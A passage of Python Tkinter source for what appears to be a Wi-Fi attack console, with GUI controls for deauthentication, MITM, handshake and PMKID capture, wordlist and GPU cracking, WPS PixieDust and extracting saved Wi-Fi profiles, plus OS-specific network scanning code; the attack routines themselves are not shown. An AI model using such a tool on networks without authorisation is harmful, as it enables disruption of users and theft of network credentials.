        ssid_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
        ssid_frame.pack(fill=tk.X, padx=6, pady=1)
        tk.Label(ssid_frame, text="SSID:", font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_card"], width=6, anchor=tk.W).pack(side=tk.LEFT)
        self.target_ssid_var = tk.StringVar(value="None selected")
        tk.Label(ssid_frame, textvariable=self.target_ssid_var, font=("Consolas", 8, "bold"), fg=HACKER_THEME["fg_white"], bg=HACKER_THEME["bg_card"]).pack(side=tk.LEFT)
        
        # BSSID
        bssid_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
        bssid_frame.pack(fill=tk.X, padx=6, pady=1)
        tk.Label(bssid_frame, text="BSSID:", font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_card"], width=6, anchor=tk.W).pack(side=tk.LEFT)
        self.target_bssid_var = tk.StringVar(value="")
        tk.Label(bssid_frame, textvariable=self.target_bssid_var, font=("Consolas", 8), fg=HACKER_THEME["fg_cyan"], bg=HACKER_THEME["bg_card"]).pack(side=tk.LEFT)
        
        # Signal / Channel
        info_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
        info_frame.pack(fill=tk.X, padx=6, pady=1)
        self.target_info_var = tk.StringVar(value="")
        tk.Label(info_frame, textvariable=self.target_info_var, font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_card"]).pack(side=tk.LEFT)
    
    def _build_scan_controls(self, parent):
        """Build scan control buttons."""
        frame = tk.Frame(parent, bg=HACKER_THEME["bg_card"], bd=1, relief="solid", highlightbackground=HACKER_THEME["border"])
        frame.pack(fill=tk.X, padx=6, pady=6)
        
        tk.Label(
            frame,
            text="📡 SCAN",
            font=("Consolas", 9, "bold"),
            fg=HACKER_THEME["fg_secondary"],
            bg=HACKER_THEME["bg_card"],
        ).pack(anchor=tk.W, padx=6, pady=(4, 2))
        
        btn_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
        btn_frame.pack(fill=tk.X, padx=6, pady=2)
        
        self.btn_scan = tk.Button(
            btn_frame,
            text="START SCAN",
            font=("Consolas", 9, "bold"),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["button_fg"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["button_active_fg"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._start_scan,
        )
        self.btn_scan.pack(fill=tk.X, pady=1)
        
        btn_row = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
        btn_row.pack(fill=tk.X, padx=6, pady=1)
        
        self.btn_scan_stop = tk.Button(
            btn_row,
            text="STOP",
            font=("Consolas", 8),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["fg_red"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["fg_red"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._stop_scan,
            state=tk.DISABLED,
        )
        self.btn_scan_stop.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 2))
        
        self.btn_scan_refresh = tk.Button(
            btn_row,
            text="REFRESH",
            font=("Consolas", 8),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["button_fg"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["button_active_fg"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._refresh_tree,
        )
        self.btn_scan_refresh.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(2, 0))
    
    def _build_attack_controls(self, parent):
        """Build attack control buttons — OS-adaptive."""
        frame = tk.Frame(parent, bg=HACKER_THEME["bg_card"], bd=1, relief="solid", highlightbackground=HACKER_THEME["border"])
        frame.pack(fill=tk.X, padx=6, pady=6)
        
        tk.Label(
            frame,
            text="💥 ATTACK",
            font=("Consolas", 9, "bold"),
            fg=HACKER_THEME["fg_secondary"],
            bg=HACKER_THEME["bg_card"],
        ).pack(anchor=tk.W, padx=6, pady=(4, 2))
        
        # Attack type selector
        type_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
        type_frame.pack(fill=tk.X, padx=6, pady=1)
        
        tk.Label(type_frame, text="Type:", font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_card"], width=6, anchor=tk.W).pack(side=tk.LEFT)
        
        attack_options = ["Dictionary", "Deauth", "MITM", "Smart"]
        # Remove options not available on this platform
        if not CAN_INJECT_PACKETS:
            attack_options = [o for o in attack_options if o != "Deauth"]
        
        self.attack_type_var = tk.StringVar(value=attack_options[0] if attack_options else "Dictionary")
        self.attack_type_combo = ttk.Combobox(
            type_frame,
            textvariable=self.attack_type_var,
            values=attack_options,
            state="readonly",
            width=16,
        )
        self.attack_type_combo.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Attack button
        btn_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
        btn_frame.pack(fill=tk.X, padx=6, pady=2)
        
        self.btn_attack = tk.Button(
            btn_frame,
            text="▶ EXECUTE ATTACK",
            font=("Consolas", 9, "bold"),
            bg="#1a0000",
            fg=HACKER_THEME["fg_red"],
            activebackground="#3a0000",
            activeforeground=HACKER_THEME["fg_red"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._start_attack,
        )
        self.btn_attack.pack(fill=tk.X, pady=1)
        
        self.btn_attack_stop = tk.Button(
            btn_frame,
            text="■ STOP ATTACK",
            font=("Consolas", 8),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["fg_yellow"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["fg_yellow"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._stop_attack,
            state=tk.DISABLED,
        )
        self.btn_attack_stop.pack(fill=tk.X, pady=1)
        
        # Config fields (shown based on attack type)
        config_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
        config_frame.pack(fill=tk.X, padx=6, pady=2)
        
        # Deauth count
        deauth_frame = tk.Frame(config_frame, bg=HACKER_THEME["bg_card"])
        deauth_frame.pack(fill=tk.X, pady=1)
        tk.Label(deauth_frame, text="Count:", font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_card"], width=6, anchor=tk.W).pack(side=tk.LEFT)
        self.deauth_count_var = tk.StringVar(value="10")
        tk.Entry(
            deauth_frame,
            textvariable=self.deauth_count_var,
            font=("Consolas", 9),
            width=8,
            bg=HACKER_THEME["entry_bg"],
            fg=HACKER_THEME["entry_fg"],
            insertbackground=HACKER_THEME["entry_insert"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
        ).pack(side=tk.LEFT, padx=2)
        
        # Continuous checkbox
        self.continuous_var = tk.BooleanVar(value=False)
        tk.Checkbutton(
            deauth_frame,
            text="Continuous",
            variable=self.continuous_var,
            font=("Consolas", 8),
            fg=HACKER_THEME["fg_dim"],
            bg=HACKER_THEME["bg_card"],
            selectcolor=HACKER_THEME["bg_dark"],
            activebackground=HACKER_THEME["bg_card"],
        ).pack(side=tk.LEFT, padx=4)
    
    def _build_capture_controls(self, parent):
        """Build packet capture controls."""
        frame = tk.Frame(parent, bg=HACKER_THEME["bg_card"], bd=1, relief="solid", highlightbackground=HACKER_THEME["border"])
        frame.pack(fill=tk.X, padx=6, pady=6)
        
        tk.Label(
            frame,
            text="📥 CAPTURE",
            font=("Consolas", 9, "bold"),
            fg=HACKER_THEME["fg_secondary"],
            bg=HACKER_THEME["bg_card"],
        ).pack(anchor=tk.W, padx=6, pady=(4, 2))
        
        btn_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
        btn_frame.pack(fill=tk.X, padx=6, pady=2)
        
        self.btn_capture = tk.Button(
            btn_frame,
            text="▶ START CAPTURE",
            font=("Consolas", 9, "bold"),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["fg_cyan"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["fg_cyan"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._start_capture,
        )
        self.btn_capture.pack(fill=tk.X, pady=1)
        
        self.btn_capture_stop = tk.Button(
            btn_frame,
            text="■ STOP CAPTURE",
            font=("Consolas", 8),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["fg_yellow"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["fg_yellow"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._stop_capture,
            state=tk.DISABLED,
        )
        self.btn_capture_stop.pack(fill=tk.X, pady=1)
        
        # Config
        config_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
        config_frame.pack(fill=tk.X, padx=6, pady=2)
        
        # Timeout
        timeout_frame = tk.Frame(config_frame, bg=HACKER_THEME["bg_card"])
        timeout_frame.pack(fill=tk.X, pady=1)
        tk.Label(timeout_frame, text="Timeout:", font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_card"], width=8, anchor=tk.W).pack(side=tk.LEFT)
        self.capture_timeout_var = tk.StringVar(value="60")
        tk.Entry(
            timeout_frame,
            textvariable=self.capture_timeout_var,
            font=("Consolas", 9),
            width=8,
            bg=HACKER_THEME["entry_bg"],
            fg=HACKER_THEME["entry_fg"],
            insertbackground=HACKER_THEME["entry_insert"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
        ).pack(side=tk.LEFT, padx=2)
        tk.Label(timeout_frame, text="sec", font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_card"]).pack(side=tk.LEFT)
        
        # Filter
        filter_frame = tk.Frame(config_frame, bg=HACKER_THEME["bg_card"])
        filter_frame.pack(fill=tk.X, pady=1)
        tk.Label(filter_frame, text="Filter:", font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_card"], width=8, anchor=tk.W).pack(side=tk.LEFT)
        self.capture_filter_var = tk.StringVar(value="all")
        filter_combo = ttk.Combobox(
            filter_frame,
            textvariable=self.capture_filter_var,
            values=["all", "handshake", "http", "pmkid"],
            state="readonly",
            width=12,
        )
        filter_combo.pack(side=tk.LEFT, fill=tk.X, expand=True)
    
    def _build_crack_controls(self, parent):
        """Build cracking controls."""
        frame = tk.Frame(parent, bg=HACKER_THEME["bg_card"], bd=1, relief="solid", highlightbackground=HACKER_THEME["border"])
        frame.pack(fill=tk.X, padx=6, pady=6)
        
        tk.Label(
            frame,
            text="🔓 CRACK",
            font=("Consolas", 9, "bold"),
            fg=HACKER_THEME["fg_secondary"],
            bg=HACKER_THEME["bg_card"],
        ).pack(anchor=tk.W, padx=6, pady=(4, 2))
        
        btn_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
        btn_frame.pack(fill=tk.X, padx=6, pady=2)
        
        self.btn_crack = tk.Button(
            btn_frame,
            text="▶ START CRACKING",
            font=("Consolas", 9, "bold"),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["fg_magenta"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["fg_magenta"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._start_crack,
        )
        self.btn_crack.pack(fill=tk.X, pady=1)
        
        self.btn_crack_stop = tk.Button(
            btn_frame,
            text="■ STOP CRACKING",
            font=("Consolas", 8),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["fg_orange"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["fg_orange"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._stop_crack,
            state=tk.DISABLED,
        )
        self.btn_crack_stop.pack(fill=tk.X, pady=1)
        
        # Config
        config_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
        config_frame.pack(fill=tk.X, padx=6, pady=2)
        
        # Wordlist path
        wl_frame = tk.Frame(config_frame, bg=HACKER_THEME["bg_card"])
        wl_frame.pack(fill=tk.X, pady=1)
        tk.Label(wl_frame, text="Wordlist:", font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_card"], width=8, anchor=tk.W).pack(side=tk.LEFT)
        self.wordlist_var = tk.StringVar(value=str(DEFAULT_WORDLIST) if DEFAULT_WORDLIST else "/usr/share/wordlists/rockyou.txt")
        wl_entry = tk.Entry(
            wl_frame,
            textvariable=self.wordlist_var,
            font=("Consolas", 8),
            bg=HACKER_THEME["entry_bg"],
            fg=HACKER_THEME["entry_fg"],
            insertbackground=HACKER_THEME["entry_insert"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
        )
        wl_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
        
        tk.Button(
            wl_frame,
            text="...",
            font=("Consolas", 8, "bold"),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["button_fg"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._browse_wordlist,
        ).pack(side=tk.LEFT)
        
        # GPU toggle
        gpu_frame = tk.Frame(config_frame, bg=HACKER_THEME["bg_card"])
        gpu_frame.pack(fill=tk.X, pady=1)
        self.gpu_var = tk.BooleanVar(value=CAN_HASHCAT_GPU)
        gpu_cb = tk.Checkbutton(
            gpu_frame,
            text="GPU Acceleration",
            variable=self.gpu_var,
            font=("Consolas", 8),
            fg=HACKER_THEME["fg_dim"],
            bg=HACKER_THEME["bg_card"],
            selectcolor=HACKER_THEME["bg_dark"],
            activebackground=HACKER_THEME["bg_card"],
        )
        gpu_cb.pack(side=tk.LEFT)
        
        if not CAN_HASHCAT_GPU:
            gpu_cb.config(state=tk.DISABLED, fg=HACKER_THEME["button_disabled_fg"])
        
        # Threads
        tk.Label(gpu_frame, text="Threads:", font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_card"]).pack(side=tk.LEFT, padx=(10, 2))
        self.threads_var = tk.StringVar(value=str(min(32, CPU_COUNT * 2)))
        tk.Entry(
            gpu_frame,
            textvariable=self.threads_var,
            font=("Consolas", 9),
            width=5,
            bg=HACKER_THEME["entry_bg"],
            fg=HACKER_THEME["entry_fg"],
            insertbackground=HACKER_THEME["entry_insert"],
            bd=1,
            relief="solid",
            highlightbackground=HACKER_THEME["border"],
        ).pack(side=tk.LEFT, padx=2)
    
    def _build_os_tools(self, parent):
        """Build OS-specific tool section — dynamically adapts per platform."""
        frame = tk.Frame(parent, bg=HACKER_THEME["bg_card"], bd=1, relief="solid", highlightbackground=HACKER_THEME["border"])
        frame.pack(fill=tk.X, padx=6, pady=6)
        
        tk.Label(
            frame,
            text=f"⚙ {SYSTEM} TOOLS",
            font=("Consolas", 9, "bold"),
            fg=HACKER_THEME["fg_secondary"],
            bg=HACKER_THEME["bg_card"],
        ).pack(anchor=tk.W, padx=6, pady=(4, 2))
        
        btn_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
        btn_frame.pack(fill=tk.X, padx=6, pady=2)
        
        # Extract WiFi profiles — available on all platforms
        self.btn_extract = tk.Button(
            btn_frame,
            text="📋 EXTRACT PROFILES",
            font=("Consolas", 8, "bold"),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["fg_yellow"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["button_active_fg"],
            bd=1, relief="solid", highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._extract_profiles,
        )
        self.btn_extract.pack(fill=tk.X, pady=1)
        
        # Linux-specific: Monitor Mode
        if IS_LINUX and CAN_MONITOR_MODE:
            mm_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
            mm_frame.pack(fill=tk.X, padx=6, pady=1)
            self.btn_monitor = tk.Button(
                mm_frame,
                text="📡 ENABLE MONITOR MODE",
                font=("Consolas", 8),
                bg=HACKER_THEME["button_bg"],
                fg=HACKER_THEME["fg_orange"],
                activebackground=HACKER_THEME["button_active_bg"],
                activeforeground=HACKER_THEME["button_active_fg"],
                bd=1, relief="solid", highlightbackground=HACKER_THEME["border"],
                cursor="hand2",
                command=self._toggle_monitor_mode,
            )
            self.btn_monitor.pack(fill=tk.X, pady=1)
        
        # Linux-specific: WPS PixieDust
        if IS_LINUX and CAN_PIXIEDUST:
            pixie_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
            pixie_frame.pack(fill=tk.X, padx=6, pady=1)
            self.btn_pixie = tk.Button(
                pixie_frame,
                text="🔓 WPS PIXIEDUST",
                font=("Consolas", 8),
                bg=HACKER_THEME["button_bg"],
                fg=HACKER_THEME["fg_magenta"],
                activebackground=HACKER_THEME["button_active_bg"],
                activeforeground=HACKER_THEME["button_active_fg"],
                bd=1, relief="solid", highlightbackground=HACKER_THEME["border"],
                cursor="hand2",
                command=self._start_pixie,
            )
            self.btn_pixie.pack(fill=tk.X, pady=1)
        
        # Check dependencies button
        self.btn_check_deps = tk.Button(
            btn_frame,
            text="🔍 CHECK DEPS",
            font=("Consolas", 8),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["fg_cyan"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["button_active_fg"],
            bd=1, relief="solid", highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._check_deps,
        )
        self.btn_check_deps.pack(fill=tk.X, pady=1)
    
    def _build_session_controls(self, parent):
        """Build session save/load controls."""
        frame = tk.Frame(parent, bg=HACKER_THEME["bg_card"], bd=1, relief="solid", highlightbackground=HACKER_THEME["border"])
        frame.pack(fill=tk.X, padx=6, pady=6)
        
        tk.Label(
            frame,
            text="💾 SESSION",
            font=("Consolas", 9, "bold"),
            fg=HACKER_THEME["fg_secondary"],
            bg=HACKER_THEME["bg_card"],
        ).pack(anchor=tk.W, padx=6, pady=(4, 2))
        
        btn_frame = tk.Frame(frame, bg=HACKER_THEME["bg_card"])
        btn_frame.pack(fill=tk.X, padx=6, pady=2)
        
        self.btn_save = tk.Button(
            btn_frame,
            text="SAVE SESSION",
            font=("Consolas", 8),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["button_fg"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["button_active_fg"],
            bd=1, relief="solid", highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._save_session,
        )
        self.btn_save.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 2))
        
        self.btn_load = tk.Button(
            btn_frame,
            text="LOAD SESSION",
            font=("Consolas", 8),
            bg=HACKER_THEME["button_bg"],
            fg=HACKER_THEME["button_fg"],
            activebackground=HACKER_THEME["button_active_bg"],
            activeforeground=HACKER_THEME["button_active_fg"],
            bd=1, relief="solid", highlightbackground=HACKER_THEME["border"],
            cursor="hand2",
            command=self._load_session,
        )
        self.btn_load.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(2, 0))
    
    def _build_footer(self):
        """Build the footer stats bar."""
        footer_frame = tk.Frame(self.root, bg=HACKER_THEME["bg_medium"], height=26)
        footer_frame.pack(fill=tk.X, side=tk.BOTTOM, padx=0, pady=0)
        footer_frame.pack_propagate(False)
        
        # Stats labels
        self.footer_aps = tk.Label(
            footer_frame, text="APs: 0",
            font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_medium"]
        )
        self.footer_aps.pack(side=tk.LEFT, padx=(10, 4))
        
        self.footer_clients = tk.Label(
            footer_frame, text="Clients: 0",
            font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_medium"]
        )
        self.footer_clients.pack(side=tk.LEFT, padx=4)
        
        self.footer_packets = tk.Label(
            footer_frame, text="Pkts: 0",
            font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_medium"]
        )
        self.footer_packets.pack(side=tk.LEFT, padx=4)
        
        self.footer_elapsed = tk.Label(
            footer_frame, text="Elapsed: 00:00",
            font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_medium"]
        )
        self.footer_elapsed.pack(side=tk.LEFT, padx=4)
        
        self.footer_mode = tk.Label(
            footer_frame, text="Mode: Ready",
            font=("Consolas", 8), fg=HACKER_THEME["fg_primary"], bg=HACKER_THEME["bg_medium"]
        )
        self.footer_mode.pack(side=tk.RIGHT, padx=10)
        
        self.footer_iface = tk.Label(
            footer_frame, text="Iface: --",
            font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_medium"]
        )
        self.footer_iface.pack(side=tk.RIGHT, padx=4)
        
        self.footer_os = tk.Label(
            footer_frame, text=f"OS: {SYSTEM}",
            font=("Consolas", 8), fg=HACKER_THEME["fg_dim"], bg=HACKER_THEME["bg_medium"]
        )
        self.footer_os.pack(side=tk.RIGHT, padx=4)
    
    # ========================================================================
    # KEYBOARD SHORTCUTS
    # ========================================================================
    
    def _bind_shortcuts(self):
        """Bind global keyboard shortcuts for power users."""
        self.root.bind("<Control-s>", lambda e: self._start_scan())
        self.root.bind("<Control-S>", lambda e: self._start_scan())
        self.root.bind("<Control-a>", lambda e: self._start_attack())
        self.root.bind("<Control-A>", lambda e: self._start_attack())
        self.root.bind("<Control-c>", lambda e: self._start_capture())
        self.root.bind("<Control-C>", lambda e: self._start_capture())
        self.root.bind("<Control-r>", lambda e: self._start_crack())
        self.root.bind("<Control-R>", lambda e: self._start_crack())
        self.root.bind("<Control-l>", lambda e: self._clear_terminal())
        self.root.bind("<Control-L>", lambda e: self._clear_terminal())
        self.root.bind("<Control-q>", lambda e: self._on_close())
        self.root.bind("<Control-Q>", lambda e: self._on_close())
        self.root.bind("<Escape>", lambda e: self._stop_all())
        self.root.bind("<F5>", lambda e: self._start_scan())
        self.root.bind("<Delete>", lambda e: self._clear_terminal())
    
    # ========================================================================
    # LOG QUEUE POLLER (Thread-safe GUI updates)
    # ========================================================================
    
    def _poll_log_queue(self):
        """Poll the log queue from the main thread and update the terminal widget.
        
        This is the critical thread-safety bridge: all engine threads push
        log messages to MedusaConsole.log_queue, and this method runs on the
        TKinter main thread via root.after() to consume them safely.
        """
        try:
            while True:
                entry = self.log_queue.get_nowait()
                self._append_log(entry.get("message", ""), entry.get("level", "info"))
        except queue.Empty:
            pass
        finally:
            self.root.after(100, self._poll_log_queue)
    
    def _append_log(self, message: str, level: str = "info"):
        """Append a colored log message to the terminal widget.
        
        Args:
            message: The log text
            level: Log level name (info, ok, warn, err, found, etc.)
        """
        if not message:
            return
            
        self.log_text.config(state=tk.NORMAL)
        
        # Add timestamp
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] ", "timestamp")
        
        # Add level prefix
        prefix_map = {
            "info": "[*]", "ok": "[+]", "warn": "[!]", "err": "[-]",
            "found": "[→]", "deauth": "[⚡]", "mitm": "[🌀]",
            "hijack": "[🕸]", "debug": "[…]", "critical": "[‼]",
            "success": "[✓]", "banner": "",
        }
        prefix = prefix_map.get(level, "[*]")
        tag = f"log_{level}" if f"log_{level}" in self.log_text.tag_names() else "log_info"
        
        if prefix:
            self.log_text.insert(tk.END, f"{prefix} ", tag)
        
        # Insert message with tag
        self.log_text.insert(tk.END, f"{message}\n", tag)
        
        # Trim buffer if too large
        if self.log_text.index("end-1c").split(".")[0] > str(self._max_log_lines):
            self.log_text.delete("1.0", f"{self._max_log_lines // 2}.0")
        
        self.log_text.config(state=tk.DISABLED)
        
        # Auto-scroll
        if self._log_auto_scroll.get():
            self.log_text.see(tk.END)
        
        # Update status label
        status_text = message[:80] + ("..." if len(message) > 80 else "")
        self.term_status_label.config(text=status_text)

    # ========================================================================
    # NETWORK SCAN OPERATIONS (Threaded)
    # ========================================================================
    
    def _start_scan(self):
        """Start a background network scan thread."""
        if self._scan_in_progress:
            self._log("Scan already in progress.", "warn")
            return
        
        self._scan_in_progress = True
        self._stop_events["scan"] = threading.Event()
        
        # Update UI
        self.btn_scan.config(state=tk.DISABLED, text="SCANNING...")
        self.btn_scan_stop.config(state=tk.NORMAL)
        self.op_status_label.config(text="● Scanning...", fg=HACKER_THEME["status_busy"])
        self.op_progress.pack(fill=tk.X, side=tk.BOTTOM, padx=8, pady=(0, 4))
        self.op_progress.start(15)
        self.footer_mode.config(text="Mode: SCANNING", fg=HACKER_THEME["fg_yellow"])
        
        self._log("Starting network scan...", "info")
        
        thread = threading.Thread(target=self._scan_worker, daemon=True, name="scan-worker")
        self._threads["scan"] = thread
        thread.start()
    
    def _scan_worker(self):
        """Background scan worker — OS-adaptive scanning."""
        stop_event = self._stop_events.get("scan")
        networks = []
        
        try:
            # Determine best scanning method for current OS
            if IS_LINUX:
                networks = self._scan_linux(stop_event)
            elif IS_MACOS:
                networks = self._scan_macos(stop_event)
            elif IS_WINDOWS:
                networks = self._scan_windows(stop_event)
            else:
                networks = self._scan_fallback(stop_event)
            
            # Update tree on main thread
            self.root.after(0, self._update_network_tree, networks)
            self.root.after(0, self._log, f"Scan complete: {len(networks)} networks found.", "ok")
            
        except Exception as e:
            self.root.after(0, self._log, f"Scan failed: {e}", "err")
            if self.console and self.console.verbose:
                traceback.print_exc()
        finally:
            self.root.after(0, self._scan_complete)
    
    def _scan_linux(self, stop_event: threading.Event) -> List[Dict]:
        """Linux scan using iw dev scan (most detailed)."""
        networks = []
        
        # Try iw first
        try:
            result = subprocess.run(
                ["iw", "dev", "scan"],
                capture_output=True, text=True, timeout=25,
            )
            if result.returncode == 0:
                networks = self._parse_iw_scan(result.stdout)
            else:
                # Fallback to iwlist
                self.root.after(0, self._log, "iw scan failed, trying iwlist...", "warn")
                result = subprocess.run(
                    ["iwlist", "scan"],
                    capture_output=True, text=True, timeout=25,
                )
                if result.returncode == 0:
                    networks = self._parse_iwlist_scan(result.stdout)
        except FileNotFoundError:
            # Try nmcli
            self.root.after(0, self._log, "iw not found, trying nmcli...", "info")
            try:
                result = subprocess.run(
                    ["nmcli", "-t", "-f", "SSID,BSSID,CHAN,SIGNAL,SECURITY", "dev", "wifi", "list"],
                    capture_output=True, text=True, timeout=15,
                )
                if result.returncode == 0:
                    networks = self._parse_nmcli_scan(result.stdout)
            except FileNotFoundError:
                self.root.after(0, self._log, "No scan tool found. Install iw or network-manager.", "err")
        except subprocess.TimeoutExpired:
            self.root.after(0, self._log, "Scan timed out.", "err")
        
        # Get additional client info via arp-scan if available
        if stop_event and stop_event.is_set():
            return networks
        
        try:
            arp_result = subprocess.run(
                ["arp", "-a"], capture_output=True, text=True, timeout=5
            )
            if arp_result.returncode == 0:
                clients = self._parse_arp(arp_result.stdout)
                self.root.after(0, self._update_client_count, clients)
        except Exception:
            pass
        
        return networks
    
    def _scan_macos(self, stop_event: threading.Event) -> List[Dict]:
        """macOS scan using airport CLI."""
        networks = []
        
        # Find airport path
        airport_paths = [
            "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport",
            "/usr/sbin/airport",
        ]
        airport = None
        for p in airport_paths:
            if os.path.exists(p):
                airport = p
                break
        
        if not airport:
            self.root.after(0, self._log, "airport CLI not found. Symlink it first.", "err")
            return networks
        
        try:
            result = subprocess.run(
                [airport, "--scan"],
                capture_output=True, text=True, timeout=20,
            )
            if result.returncode == 0:
                networks = self._parse_airport_scan(result.stdout)
        except subprocess.TimeoutExpired:
            self.root.after(0, self._log, "Scan timed out.", "err")
        
        return networks
    
    def _scan_windows(self, stop_event: threading.Event) -> List[Dict]:
        """Windows scan using netsh wlan + optional pywifi enhancement."""
        networks = []
        
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "networks", "mode=Bssid"],
                capture_output=True, text=True, timeout=20,
            )
            if result.returncode == 0:
                networks = self._parse_netsh_scan(result.stdout)
        except subprocess.TimeoutExpired:
            self.root.after(0, self._log, "netsh scan timed out.", "err")
        
        # Try pywifi for signal strength enhancement
        try:
            import pywifi
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.scan()
            time.sleep(2)
            pywifi_results = iface.scan_results()
            
            # Merge pywifi data into netsh data
            for ap in pywifi_results:
                if ap.bssid:
                    bssid = ap.bssid.upper()
                    for net in networks:
                        if net.get("bssid", "").upper() == bssid:
                            net["signal_dbm"] = ap.signal
                            if hasattr(ap, 'akm') and ap.akm:
                                net["auth"] = str(ap.akm[0])
                            break
                    else:
                        # AP only found by pywifi
                        networks.append({
                            "ssid": ap.ssid,
                            "bssid": ap.bssid,
                            "signal": ap.signal,
                            "channel": ap.freq if hasattr(ap, 'freq') else 0,
                            "encryption": str(ap.akm[0]) if hasattr(ap, 'akm') and ap.akm else "OPEN",
                            "clients": [],
                        })
        except ImportError:
            pass  # pywifi optional
        
        return networks
    
    def _scan_fallback(self, stop_event: threading.Event) -> List[Dict]:
        """Universal fallback — pure pywifi or socket-based."""
        networks = []
        
        try:
            import pywifi
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
            iface.scan()
            time.sleep(3)
            results = iface.scan_results()
            
            for ap in results:
                networks.append({
                    "ssid": ap.ssid,
                    "bssid": ap.bssid,
                    "signal": ap.signal,
                    "channel": ap.freq if hasattr(ap, 'freq') else 0,
                    "encryption": str(ap.akm[0]) if hasattr(ap, 'akm') and ap.akm else "OPEN",
